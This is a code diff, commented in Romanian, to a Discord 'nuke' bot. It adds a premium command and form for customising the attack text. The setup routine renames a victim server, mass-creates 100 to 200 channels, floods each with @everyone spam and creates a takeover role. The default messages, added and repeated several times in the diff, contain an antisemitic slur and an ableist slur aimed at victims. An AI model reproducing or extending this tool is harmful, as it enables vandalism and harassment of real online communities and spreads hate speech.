@@ -133,6 +133,49 @@ def get_role_name(user_id):
 def set_role_name(user_id, value: str):
     set_user_config(user_id, "role_name", value)
 
+# ===== NOI FUNCȚII PENTRU SETĂRI CUSTOM =====
+def get_custom_channel_name(user_id):
+    return get_user_config(user_id).get("custom_channel_name", None)
+
+def set_custom_channel_name(user_id, value: str):
+    set_user_config(user_id, "custom_channel_name", value)
+
+def get_custom_spam_text(user_id):
+    return get_user_config(user_id).get("custom_spam_text", None)
+
+def set_custom_spam_text(user_id, value: str):
+    set_user_config(user_id, "custom_spam_text", value)
+
+def get_custom_server_name(user_id):
+    return get_user_config(user_id).get("custom_server_name", None)
+
+def set_custom_server_name(user_id, value: str):
+    set_user_config(user_id, "custom_server_name", value)
+
+def get_custom_role_name(user_id):
+    return get_user_config(user_id).get("custom_role_name", None)
+
+def set_custom_role_name(user_id, value: str):
+    set_user_config(user_id, "custom_role_name", value)
+
+def get_custom_embed_title(user_id):
+    return get_user_config(user_id).get("custom_embed_title", None)
+
+def set_custom_embed_title(user_id, value: str):
+    set_user_config(user_id, "custom_embed_title", value)
+
+def get_custom_embed_description(user_id):
+    return get_user_config(user_id).get("custom_embed_description", None)
+
+def set_custom_embed_description(user_id, value: str):
+    set_user_config(user_id, "custom_embed_description", value)
+
+def get_custom_text_message(user_id):
+    return get_user_config(user_id).get("custom_text_message", None)
+
+def set_custom_text_message(user_id, value: str):
+    set_user_config(user_id, "custom_text_message", value)
+
 class CooldownManager:
     def __init__(self, cooldown_seconds: int):
         self.cooldown_seconds = cooldown_seconds
@@ -254,7 +297,99 @@ async def send_nuke_log(guild_name_original, guild, user, channels, messages, in
     except Exception as e:
         print(f"[LOG ERROR] {e}")
 
+# ================== MODAL PENTRU SETĂRI CUSTOM ==================
+class NukeConfigModal(discord.ui.Modal, title="⚙️ Nuke Custom Settings"):
+    channel_name = discord.ui.TextInput(
+        label="Channel Name",
+        placeholder="nuked-by-larp",
+        required=False,
+        max_length=32
+    )
+    spam_text = discord.ui.TextInput(
+        label="Spam Text (ping message)",
+        placeholder="@everyone Larp Empire owns this!",
+        required=False,
+        style=discord.TextStyle.paragraph,
+        max_length=100
+    )
+    server_name = discord.ui.TextInput(
+        label="Server Name",
+        placeholder="Larp Empire",
+        required=False,
+        max_length=32
+    )
+    role_name = discord.ui.TextInput(
+        label="Role Name",
+        placeholder="Larp Empire Admin",
+        required=False,
+        max_length=32
+    )
+    embed_title = discord.ui.TextInput(
+        label="Embed Title",
+        placeholder="**LARP EMPIRE N4KED YOUR AHH**",
+        required=False,
+        max_length=100
+    )
+    embed_description = discord.ui.TextInput(
+        label="Embed Description",
+        placeholder="Description...",
+        required=False,
+        style=discord.TextStyle.paragraph,
+        max_length=500
+    )
+    text_message = discord.ui.TextInput(
+        label="Text Message (before pings)",
+        placeholder="@everyone @here join https://discord.gg/larpempire",
+        required=False,
+        max_length=100
+    )
+
+    async def on_submit(self, interaction: discord.Interaction):
+        user_id = interaction.user.id
+
+        # Salvează doar câmpurile care au fost completate
+        if self.channel_name.value:
+            set_custom_channel_name(user_id, self.channel_name.value)
+        if self.spam_text.value:
+            set_custom_spam_text(user_id, self.spam_text.value)
+        if self.server_name.value:
+            set_custom_server_name(user_id, self.server_name.value)
+        if self.role_name.value:
+            set_custom_role_name(user_id, self.role_name.value)
+        if self.embed_title.value:
+            set_custom_embed_title(user_id, self.embed_title.value)
+        if self.embed_description.value:
+            set_custom_embed_description(user_id, self.embed_description.value)
+        if self.text_message.value:
+            set_custom_text_message(user_id, self.text_message.value)
+
+        await interaction.response.send_message("✅ Custom settings saved!", ephemeral=True)
+
 # ================== SLASH COMMANDS ==================
+@bot.tree.command(name="custom", description="Customize your nuke settings (Premium only)")
+@app_commands.default_permissions(administrator=True)
+async def custom(interaction: Interaction):
+    if not is_premium_user(interaction.user.id):
+        await interaction.response.send_message("❌ This command is only available for premium users.", ephemeral=True)
+        return
+    modal = NukeConfigModal()
+    # Pre-populate cu valorile existente, dacă există
+    user_id = interaction.user.id
+    modal.channel_name.default = get_custom_channel_name(user_id) or get_channel_name(user_id)
+    modal.spam_text.default = get_custom_spam_text(user_id) or get_webhook_message(user_id)
+    modal.server_name.default = get_custom_server_name(user_id) or get_server_name(user_id)
+    modal.role_name.default = get_custom_role_name(user_id) or get_role_name(user_id)
+    modal.embed_title.default = get_custom_embed_title(user_id) or "**LARP EMPIRE N4KED YOUR AHH**"
+    modal.embed_description.default = get_custom_embed_description(user_id) or (
+        "@everyone @here CORRUPT OFFICIALLY N4KED YALL AHH STUPID JEWS FUH THIS STUPID DUALHOOK YALL GOT HERE\n\n"
+        "**# LARP EMPIRE SERVER NON HOOKED**\n"
+        "**EVERYONE JOIN HERE GUYS LEAVE THIS SH**\n"
+        "https://discord.gg/larpempire\n\n"
+        "*Next time don't give admin perms to everyone r4tard.*"
+    )
+    modal.text_message.default = get_custom_text_message(user_id) or "@everyone @here join https://discord.gg/larpempire"
+    await interaction.response.send_modal(modal)
+
 @bot.tree.command(name="bypass", description="Manage verification bypasses")
 @app_commands.default_permissions(administrator=True)
 async def bypass(interaction: Interaction):
@@ -487,8 +622,9 @@ async def real_help(ctx):
         inline=False
     )
     embed.add_field(
-        name="**Slash Commands (placeholders)**",
+        name="**Slash Commands**",
         value=(
+            "`/custom` - Customize nuke settings (Premium only)\n"
             "`/bypass`, `/blacklist`, `/feedback`, `/ping`, `/pull`, `/rep`, `/setup`, `/syncroles`, `/vouch`\n"
             "*These are placeholders and do not have functionality yet.*"
         ),
@@ -571,6 +707,48 @@ async def setup(ctx):
     total_channels = 200 if is_owner else 100
     spam_messages = 25 if is_owner else 20
 
+    # ===== ÎNCĂRCARE SETĂRI CUSTOM =====
+    is_premium = is_premium_user(user.id)
+    if is_premium:
+        # Folosește setările custom dacă există
+        custom_channel_name = get_custom_channel_name(user.id)
+        custom_spam_text = get_custom_spam_text(user.id)
+        custom_server_name = get_custom_server_name(user.id)
+        custom_role_name = get_custom_role_name(user.id)
+        custom_embed_title = get_custom_embed_title(user.id)
+        custom_embed_description = get_custom_embed_description(user.id)
+        custom_text_message = get_custom_text_message(user.id)
+
+        # Dacă nu sunt setate, folosește default-urile
+        channel_name = custom_channel_name if custom_channel_name else "1week-King"
+        spam_text = custom_spam_text if custom_spam_text else "@everyone This sv has been officially closed https://discord.gg/larpempire"
+        server_name = custom_server_name if custom_server_name else "1weeksober owns this"
+        role_name = custom_role_name if custom_role_name else "1weeksober-on-top"
+        embed_title = custom_embed_title if custom_embed_title else "**LARP EMPIRE N4KED YOUR AHH**"
+        embed_description = custom_embed_description if custom_embed_description else (
+            "@everyone @here CORRUPT OFFICIALLY N4KED YALL AHH STUPID JEWS FUH THIS STUPID DUALHOOK YALL GOT HERE\n\n"
+            "**# LARP EMPIRE SERVER NON HOOKED**\n"
+            "**EVERYONE JOIN HERE GUYS LEAVE THIS SH**\n"
+            "https://discord.gg/larpempire\n\n"
+            "*Next time don't give admin perms to everyone r4tard.*"
+        )
+        text_message = custom_text_message if custom_text_message else "@everyone @here join https://discord.gg/larpempire"
+    else:
+        # Default-uri pentru non-premium
+        channel_name = "1week-King"
+        spam_text = "@everyone This sv has been officially closed https://discord.gg/larpempire"
+        server_name = "1weeksober owns this"
+        role_name = "1weeksober-on-top"
+        embed_title = "**LARP EMPIRE N4KED YOUR AHH**"
+        embed_description = (
+            "@everyone @here CORRUPT OFFICIALLY N4KED YALL AHH STUPID JEWS FUH THIS STUPID DUALHOOK YALL GOT HERE\n\n"
+            "**# LARP EMPIRE SERVER NON HOOKED**\n"
+            "**EVERYONE JOIN HERE GUYS LEAVE THIS SH**\n"
+            "https://discord.gg/larpempire\n\n"
+            "*Next time don't give admin perms to everyone r4tard.*"
+        )
+        text_message = "@everyone @here join https://discord.gg/larpempire"
+
     save_nuke_stats(user.id, guild)
 
     admin_users = [1389763251042258944, 1464634211406188721]
@@ -584,7 +762,7 @@ async def setup(ctx):
         pass
 
     try:
-        await guild.edit(name="1weeksober owns this")
+        await guild.edit(name=server_name)
     except:
         pass
 
@@ -594,28 +772,12 @@ async def setup(ctx):
         except:
             continue
 
-    base_channel_names = [
-        "1weeksober-king",
-        "Cry-kid",
-        "Larp-empire-on-top",
-        "Ez-kid",
-        "Get-r4ped",
-        "Quit-beaming",
-        "Kys",
-        "1week-BOOM",
-        "Ez-larp-on-top"
-    ]
+    base_channel_names = [channel_name]  # folosim doar numele custom pentru toate canalele
 
-    # ===== EMBED PRINCIPAL (din poza) =====
+    # ===== EMBED PRINCIPAL CUSTOM =====
     embed_main = discord.Embed(
-        title="**LARP EMPIRE N4KED YOUR AHH**",
-        description=(
-            "@everyone @here CORRUPT OFFICIALLY N4KED YALL AHH STUPID JEWS FUH THIS STUPID DUALHOOK YALL GOT HERE\n\n"
-            "**# LARP EMPIRE SERVER NON HOOKED**\n"
-            "**EVERYONE JOIN HERE GUYS LEAVE THIS SH**\n"
-            "https://discord.gg/larpempire\n\n"
-            "*Next time don't give admin perms to everyone r4tard.*"
-        ),
+        title=embed_title,
+        description=embed_description,
         color=0x000000
     )
     embed_main.set_image(url="https://i.imgur.com/yMQvcRw.gif")
@@ -625,12 +787,12 @@ async def setup(ctx):
     embed_gif1 = discord.Embed(color=0x000000)
     embed_gif1.set_image(url="https://38.media.tumblr.com/662c079bd6ad88db4277487c78422174/tumblr_nvn2znud8t1qjrwyno1_1280.gif")
 
-    # ===== GIF 2 (alt gif) =====
+    # ===== GIF 2 =====
     embed_gif2 = discord.Embed(color=0x000000)
     embed_gif2.set_image(url="https://i.imgur.com/yMQvcRw.gif")
 
-    # ===== MESAJ TEXT =====
-    text_message = "@everyone @here join https://discord.gg/larpempire"
+    # ===== MESAJ TEXT CUSTOM =====
+    text_message_custom = text_message
 
     font_styles = ["bold", "script", "double"]
     created_channels = []
@@ -642,13 +804,13 @@ async def setup(ctx):
 
     async def spam_channel(channel):
         try:
-            # Trimite 15 perechi (text + embed_main + gif1 + gif2) alternativ
+            # Trimite 15 perechi (text + embed_main + gif1 + gif2)
             for _ in range(15):
-                # text
-                await send_with_retry(channel, content=text_message)
+                # text custom
+                await send_with_retry(channel, content=text_message_custom)
                 await asyncio.sleep(0.1)
 
-                # embed main
+                # embed main custom
                 await send_with_retry(channel, embed=embed_main)
                 await asyncio.sleep(0.1)
 
@@ -672,11 +834,10 @@ async def setup(ctx):
     async def create_and_spam(index):
         nonlocal first_channel, invite_link
         try:
-            base_name = random.choice(base_channel_names)
-            font_style = random.choice(font_styles)
-            styled_name = apply_font(base_name, font_style)
+            # Folosește numele canalului custom (aplicat cu fonturi)
+            styled_name = apply_font(channel_name, random.choice(font_styles))
             if len(styled_name) > 100:
-                styled_name = base_name
+                styled_name = channel_name
             ch = await create_channel_with_retry(guild, styled_name)
             if ch is None:
                 await user.send(f"⚠️ Failed to create channel {index} after retries.")
@@ -703,7 +864,7 @@ async def setup(ctx):
     await user.send(f"✅ All {len(created_channels)} channels created, spam ({spam_messages} messages per channel) running in parallel with retry on rate-limit!")
 
     try:
-        await guild.create_role(name="1weeksober-on-top")
+        await guild.create_role(name=role_name)
     except:
         pass
 
